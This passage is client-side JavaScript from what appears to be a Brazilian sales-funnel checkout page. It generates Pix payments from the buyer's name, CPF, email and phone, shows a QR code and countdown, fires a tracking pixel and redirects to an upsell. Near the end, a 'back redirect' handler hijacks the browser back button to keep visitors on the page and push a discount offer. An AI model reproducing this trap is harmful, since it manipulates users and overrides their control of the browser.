            if (urlParams.has(param)) utmParams[param] = urlParams.get(param); 
        });
        return new URLSearchParams(utmParams).toString();
    }

    function startPixCountdown() {
        if (pixCountdownInterval) clearInterval(pixCountdownInterval);

        const display = document.getElementById("pix-expiration");
        if (!display) return;

        let duration = 5 * 60; 
        
        function updateTimer() {
            const minutes = Math.floor(duration / 60);
            const seconds = duration % 60;

            const m = minutes < 10 ? "0" + minutes : minutes;
            const s = seconds < 10 ? "0" + seconds : seconds;

            display.textContent = `00:${m}:${s}`; 

            if (--duration < 0) {
                clearInterval(pixCountdownInterval);
                display.textContent = "Expirado";
                display.style.color = "red";
            }
        }

        updateTimer(); 
        pixCountdownInterval = setInterval(updateTimer, 1000); 
    }

    // ============================================
    // 4. L√ìGICA DO MODAL
    // ============================================
    function abrirModalPix() {
        const modal = document.getElementById("pix-modal-overlay");
        if(modal) {
            modal.classList.add("active");
            document.body.style.overflow = "hidden";
            resetUI();
            
            let valor = isDiscountPix ? "19.90" : VALOR_PADRAO;
            
            if(typeof window.getVariantPrice === 'function' && !isDiscountPix) {
                let v = window.getVariantPrice();
                if(v) valor = v;
            }

            tryGeneratePixModal(cleanAmountForAPI(valor));
        }
    }

    function fecharModalPix() {
        const modal = document.getElementById("pix-modal-overlay");
        if(modal) {
            modal.classList.remove("active");
            document.body.style.overflow = "";
        }
        if (pixCheckPaymentInterval) clearInterval(pixCheckPaymentInterval);
        if (pixCountdownInterval) clearInterval(pixCountdownInterval); 
        paymentConfirmed = false;
    }

    function resetUI() {
        document.getElementById("pix-loading").style.display = "flex";
        document.getElementById("pix-payment-content").style.display = "none";
        document.getElementById("pix-error-message").style.display = "none";
        document.getElementById("pix-payment-status").style.display = "none";
        
        const input = document.getElementById("pix-modal-code");
        if(input) input.value = "";
        const qrImg = document.getElementById("pix-modal-qrcode-img");
        if(qrImg) qrImg.src = "";
        
        if (pixCountdownInterval) clearInterval(pixCountdownInterval);
    }

    // ============================================
    // 5. GERA√á√ÉO DO PIX
    // ============================================
    function tryGeneratePixModal(valorFormatado) {
        const cliente = getClienteDataModal();
        const utmString = getUtmParamsModal();

        const bodyData = new URLSearchParams();
        bodyData.append("acao", "criar");
        bodyData.append("valor", valorFormatado);
        bodyData.append("nome", cliente.nome);
        bodyData.append("cpf", cliente.documento);
        bodyData.append("email", cliente.email);
        bodyData.append("telefone", cliente.telefone);
        bodyData.append("utm", utmString);

        console.log("üöÄ Enviando para API...", valorFormatado);

        fetch(API_BASE_URL, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: bodyData.toString()
        })
        .then(async res => {
            const text = await res.text();
            try { return JSON.parse(text); } catch(e) { throw new Error("Erro na resposta do servidor"); }
        })
        .then(data => {
            if (data.erro) throw new Error(data.msg || "Erro na API");
            
            if (data.pixCode) {
                pixPaymentId = data.payment_id;
                renderPixData(data.pixCode, valorFormatado);
                iniciarPollingUnico();
            } else {
                throw new Error("C√≥digo Pix n√£o recebido.");
            }
        })
        .catch(err => {
            console.error(err);
            document.getElementById("pix-loading").style.display = "none";
            const errEl = document.getElementById("pix-error-message");
            if(errEl) {
                errEl.innerText = "Erro: " + err.message;
                errEl.style.display = "block";
            }
        });
    }

    function renderPixData(code, valor) {
        document.getElementById("pix-loading").style.display = "none";
        document.getElementById("pix-payment-content").style.display = "block";

        const elAmount = document.getElementById("pix-amount");
        if(elAmount) elAmount.innerText = "R$ " + valor.replace('.', ',');

        const inputCode = document.getElementById("pix-modal-code");
        if(inputCode) inputCode.value = code;

        const qrImg = document.getElementById("pix-modal-qrcode-img");
        if(qrImg) {
            qrImg.style.display = "block"; 
            qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&margin=10&data=${encodeURIComponent(code)}`;
        }

        startPixCountdown();

        const btnCopy = document.getElementById("pix-copy-btn");
        if(btnCopy) {
            const newBtn = btnCopy.cloneNode(true);
            btnCopy.parentNode.replaceChild(newBtn, btnCopy);
            
            newBtn.onclick = () => {
                inputCode.select();
                inputCode.setSelectionRange(0, 99999);
                navigator.clipboard.writeText(code).then(() => {
                    const originalHTML = newBtn.innerHTML;
                    newBtn.innerHTML = '<i class="fas fa-check"></i> <span>Copiado!</span>';
                    setTimeout(() => newBtn.innerHTML = originalHTML, 2000);
                }).catch(() => document.execCommand("copy"));
            };
        }
    }

    // ============================================
    // 6. VERIFICA√á√ÉO DE PAGAMENTO
    // ============================================
    function iniciarPollingUnico() {
        if (pixCheckPaymentInterval) clearInterval(pixCheckPaymentInterval);
        
        pixCheckPaymentInterval = setInterval(() => {
            if (!pixPaymentId) return;
            
            fetch(`${API_BASE_URL}?acao=verificar&payment_id=${pixPaymentId}&redirect=1`)
                .then(res => res.json())
                .then(data => {
                    if (data.status === "approved" && !paymentConfirmed) {
                        paymentConfirmed = true;
                        clearInterval(pixCheckPaymentInterval);
                        if (pixCountdownInterval) clearInterval(pixCountdownInterval); 
                        
                        document.getElementById("pix-payment-content").style.display = "none";
                        const statusEl = document.getElementById("pix-payment-status");
                        if(statusEl) {
                            statusEl.style.display = "block";
                            statusEl.innerHTML = "<h3 style='color:green;font-weight:bold;'>‚úÖ Pagamento Aprovado!<br>Liberando acesso...</h3>";
                        }
                        
                        if(!window.pixelKwaiDisparado) {
                             window.pixelKwaiDisparado = true;
                             window.kwaiPixelId = "693b89f7bf00e6171b3f8fc1";
                             var a=document.createElement("script");
                             a.async=true; a.defer=true;
                             a.src="https://cdn.utmify.com.br/scripts/pixel/pixel-kwai.js";
                             document.head.appendChild(a);
                        }

                        setTimeout(() => {
                            const utm = getUtmParamsModal();
                            window.location.href = UPSELL_URL + (utm ? "?" + utm : "");
                        }, 1500);
                    }
                }).catch(e => console.log("Aguardando..."));
        }, 4000);
    }

    // ============================================
    // 7. BACK REDIRECT / MODAL DESCONTO
    // ============================================
    function aceitarDesconto() {
        fecharModalDesconto();
        isDiscountPix = true; 
        abrirModalPix();
    }
    
    function recusarDesconto() { 
        fecharModalDesconto(); 
    }
    
    function fecharModalDesconto() { 
        const modal = document.getElementById("discount-modal-overlay");
        if(modal) modal.classList.remove("active");
    }

    document.addEventListener("DOMContentLoaded", function () {
        if(document.getElementById("nine")) {
             history.pushState(null, null, location.href);
             window.onpopstate = () => {
                 history.pushState(null, null, location.href);
                 const modal = document.getElementById("discount-modal-overlay");
                 if(modal) modal.classList.add("active");
             };
        }

        const targetSection = document.getElementById("nine");
        if(targetSection) {
            const observer = new IntersectionObserver((entries) => {
                if(entries[0].isIntersecting) {
                      var s = document.createElement("script");
                      s.src = "https://scripts.converteai.net/e25befdb-22aa-48d2-b119-7ea3daf9509d/players/69562963b1f39b1b02ab6869/v4/player.js";
                      s.async = true;
                      document.head.appendChild(s);
                      observer.disconnect();
                }
            });
            observer.observe(targetSection);
        }
    });
</script>

</body>
</html>
